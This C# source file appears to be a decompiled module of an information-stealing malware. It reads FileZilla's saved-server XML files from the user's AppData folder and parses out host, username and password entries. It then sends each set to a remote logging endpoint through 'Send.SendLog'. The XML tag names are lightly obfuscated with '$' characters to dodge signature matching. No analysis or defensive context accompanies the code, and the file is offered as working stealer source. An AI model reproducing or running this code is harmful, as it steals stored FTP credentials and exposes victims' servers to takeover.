using System;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Filezilla
{
	public static string FileZillaPass()
	{
		_ = Environment.NewLine + Environment.NewLine + "Program: FileZilla " + Environment.NewLine;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string text = null;
		string text2 = null;
		string path = Path.Combine(folderPath, "FileZilla\\recentservers.xml");
		string path2 = Path.Combine(folderPath, "FileZilla\\sitemanager.xml");
		if (File.Exists(path))
		{
			text = File.ReadAllText(path);
		}
		if (File.Exists(path2))
		{
			text2 = File.ReadAllText(path2);
		}
		return text + text2;
	}

	public static void Recover()
	{
		string text = FileZillaPass();
		int num = 0;
		while (num < text.Length && text.Length > 0 && !(!text.Contains("<Host>") | !text.Contains("<User>") | !text.Contains("<Pass>")))
		{
			string host = midReturn("$<$H$os$t$>$".Replace("$", ""), "$<$/H$o$s$t$>$".Replace("$", ""), text);
			string username = midReturn("<User>", "</User>", text);
			string password = midReturn("$<P$as$s>$".Replace("$", ""), "$<$/$P$a$ss$>$".Replace("$", ""), text);
			Send.SendLog(Camera.P_Link, "Passwords", null, null, "Filezilla", host, username, password, null);
			text = text.Replace(text.Substring(0, checked(text.IndexOf("</Pass>") + 6)), null);
		}
	}

	public static string midReturn(string first, string last, string total)
	{
		string result = null;
		if (last.Length < 1)
		{
			result = total.Substring(total.IndexOf(first));
		}
		if (first.Length < 1)
		{
			result = total.Substring(0, total.IndexOf(last));
		}
		try
		{
			result = total.Substring(total.IndexOf(first), checked(total.IndexOf(last) - total.IndexOf(first))).Replace(first, "").Replace(last, "");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}
}
